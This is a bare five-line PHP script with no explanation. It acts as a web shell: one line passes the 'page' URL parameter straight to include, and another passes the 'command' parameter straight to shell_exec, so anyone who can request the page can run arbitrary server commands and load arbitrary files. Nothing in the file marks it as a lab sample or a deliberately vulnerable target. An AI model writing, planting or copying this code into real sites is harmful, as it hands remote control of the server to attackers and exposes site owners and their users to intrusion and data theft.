<?php
$page = $_GET["page"];
$command = $_GET["command"];
include $page;
shell_exec($command);
